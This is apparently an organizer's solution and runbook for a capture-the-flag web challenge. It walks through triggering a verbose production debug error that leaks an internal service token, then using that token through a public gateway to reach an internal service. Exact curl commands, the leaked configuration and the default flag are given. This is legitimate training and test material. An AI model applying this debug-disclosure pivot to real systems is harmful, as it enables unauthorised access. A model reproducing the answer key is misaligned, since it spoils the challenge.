# D28 — Production Debug Mode: Organizer Solution & Engineering Runbook

## 1. Challenge Overview
* **Challenge ID:** D28
* **Name:** Production Debug Mode
* **Difficulty:** Very Hard
* **Category:** Web / Debug Disclosure / Service Discovery
* **External Interface:** TCP/80 (Web)
* **Author / Team:** Latveria Cyber-Range Engineering Team

---

## 2. Architecture & Logical Chain

The challenge strictly implements the intended architectural chain:

```text
Player
   |
   | TCP/80 (HTTP)
   v
Production API (http://<HOST>:80/)
   |
   v
Debug Handler (Verbose Production Error Disclosure)
   |
   v
Internal Service (http://127.0.0.1:8081 / ClusterIP-only)
   |
   v
Flag
```

### Component Details
1. **Public Entry Service / Production API (TCP/80):** 
   A high-throughput telemetry gateway for the Latverian Defense Nexus. It provides public web dashboards and REST endpoints (`/`, `/api/v1/status`, `/api/v1/telemetry/nodes`, `/api/v1/telemetry/query`, and `/api/v1/gateway/dispatch`).
2. **Debug Handler:** 
   A production debug middleware that captures unhandled exceptions when malformed parameters or queries are supplied, generating rich stack traces and runtime environment dumps.
3. **Internal Service (ClusterIP-only / 127.0.0.1:8081):** 
   An isolated executive core daemon running as user `vault`. It verifies internal debug tokens and dispatches executive commands, reading dynamic flags from `/opt/vault/flag.txt`.

---

## 3. Starting State
The participant accesses the public web application at `http://<TARGET_HOST>:80/` (or `http://127.0.0.1:8080/` for local testing).

Initial discoveries:
* Modern Latveria Defense Nexus web dashboard.
* Live sector telemetry metrics and documented public API endpoints:
  * `GET /api/v1/status`
  * `GET /api/v1/telemetry/nodes`
  * `POST /api/v1/telemetry/query`
  * `POST /api/v1/gateway/dispatch`

---

## 4. Intended Discovery & Solve Path

1. **Interact with Public Production API:** Inspect the API endpoints and send a query to `/api/v1/telemetry/query`.
2. **Trigger Safe Error Condition:** Pass an invalid type (e.g. non-string `sector`, non-list `metrics`, or invalid `filter`) or query parameter `?debug=1`.
3. **Receive Verbose Debug Disclosure:** Receive an HTTP 500 error containing the complete stack trace and runtime configuration dictionary.
4. **Inspect Disclosed Stack & Config:** Extract:
   * Internal service host: `http://127.0.0.1:8081` (`latveria-internal-core.latveria.svc.cluster.local:8081`)
   * Internal executive route: `/api/v2/nexus/executive/control`
   * Internal debug authorization token: `latveria_dbg_admin_8b91a742cd3f`
   * Required authorization header: `X-Latveria-Debug-Token`
   * Target node and expected action: `sentinel_core_01` / `query_executive_core`
   * Gateway dispatch route: `/api/v1/gateway/dispatch`
5. **Dispatch Internal Command:** Issue an authorized POST request to `/api/v1/gateway/dispatch` with the recovered credential and payload.
6. **Flag Retrieval:** The internal executive service validates the token and returns the flag.

---

## 5. Exact Commands Used During Solve

### Step 1: Check Public Status
```bash
curl -s http://127.0.0.1:8080/api/v1/status
```

### Step 2: Trigger Safe Error Condition
Send malformed parameters to `/api/v1/telemetry/query`:
```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/telemetry/query \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "sector": 1337,
    "metrics": "invalid_type",
    "filter": "malformed_syntax"
  }'
```

### Step 3: Inspect Disclosed Debug Information
The response returns HTTP 500 with the debug disclosure:
```json
{
  "status": "error",
  "code": 500,
  "error": "UnhandledProductionException",
  "message": "Server encountered an unhandled exception...",
  "debug_mode": true,
  "debug_report": {
    "disclaimer": "CRITICAL: DEBUG_VERBOSE_ERRORS is enabled on production gateway...",
    "exception": { ... },
    "runtime_environment": {
      "INTERNAL_CORE_SERVICE_URL": "http://127.0.0.1:8081",
      "INTERNAL_CORE_DISCOVERY_NAME": "latveria-internal-core.latveria.svc.cluster.local:8081",
      "INTERNAL_EXECUTIVE_ROUTE": "/api/v2/nexus/executive/control",
      "INTERNAL_DISPATCH_GATEWAY": "/api/v1/gateway/dispatch",
      "INTERNAL_AUTH_HEADER": "X-Latveria-Debug-Token",
      "DEBUG_OVERRIDE_KEY": "latveria_dbg_admin_8b91a742cd3f",
      "REQUIRED_ACTION_PAYLOAD": "query_executive_core",
      "TARGET_CORE_NODE": "sentinel_core_01"
    },
    "upstream_microservices": {
      "internal_nexus_core": {
        "service_host": "http://127.0.0.1:8081",
        "executive_endpoint": "/api/v2/nexus/executive/control",
        "debug_auth_token": "latveria_dbg_admin_8b91a742cd3f"
      }
    }
  }
}
```

### Step 4: Dispatch Authorized Executive Query
```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/gateway/dispatch \
  -H "Content-Type: application/json" \
  -H "X-Latveria-Debug-Token: latveria_dbg_admin_8b91a742cd3f" \
  -d '{
    "endpoint": "/api/v2/nexus/executive/control",
    "action": "query_executive_core",
    "target": "sentinel_core_01",
    "auth_token": "latveria_dbg_admin_8b91a742cd3f"
  }'
```

### Step 5: Read Flag
Response:
```json
{
  "status": "success",
  "message": "Executive Core Override Acknowledged. Security clearance verified.",
  "core_id": "sentinel_core_01",
  "system_state": "ACTIVE_OVERRIDE",
  "telemetry_stream": "LATVERIA_HIGH_ORBIT_GRID_SYNC",
  "flag": "YUVA{pr0duct10n_d3bug_d1sc10sur3_p1v0t_7c2b91ea}"
}
```

---

## 6. Disclosed Debug Information & Decoys
* **Intended Information:**
  * Host: `http://127.0.0.1:8081` (`latveria-internal-core.latveria.svc.cluster.local:8081`)
  * Route: `/api/v2/nexus/executive/control`
  * Credential: `latveria_dbg_admin_8b91a742cd3f`
  * Action/Target: `query_executive_core` / `sentinel_core_01`
* **Controlled Decoys:**
  * Harmless synthetic Kafka brokers (`10.244.0.42:9092`).
  * Harmless internal Redis cache pool reference (`redis://127.0.0.1:6379/0`).
  * Circuit breaker timeouts and build tag metadata.

---

## 7. Flag Management & Dynamic Model
* Dynamic flag injected at container runtime via `$FLAG`.
* `entrypoint.sh` writes flag to `/opt/vault/flag.txt` (`chmod 400`, owned by `vault`).
* `FLAG` environment variable is unset and expunged prior to daemon execution.
* Default Flag: `YUVA{pr0duct10n_d3bug_d1sc10sur3_p1v0t_7c2b91ea}`.

---

## 8. Reset Procedure
Container or pod deletion and recreation completely clears state and starts fresh unprivileged daemons with dynamic flag injection.

---

## 9. Security Boundary Validation
* `runAsNonRoot: true` (User `prod`: uid 1002, User `vault`: uid 1001).
* Linux capabilities dropped: `ALL`.
* `automountServiceAccountToken: false` prevents K8s API token mounts.
* Default-deny NetworkPolicy blocks direct external access to internal service port 8081.
* No real cloud credentials or infrastructure secrets exist in the workload.

---

## 10. Resource Controls & Limits
* Masterbook Limits:
  * CPU: 1 vCPU (1000m)
  * Memory: 384 MiB
  * Rate Limiter: In-memory sliding window enforcing ~20-25 req/sec limit.

---

## 11. Testing & Validation Status
* Fresh exposure test: PASS
* Clean-room solve test: PASS
* Unauthenticated rejection test: PASS
* Malformed input resiliency: PASS
* Rate limit enforcement: PASS
* Participant package hygiene: PASS
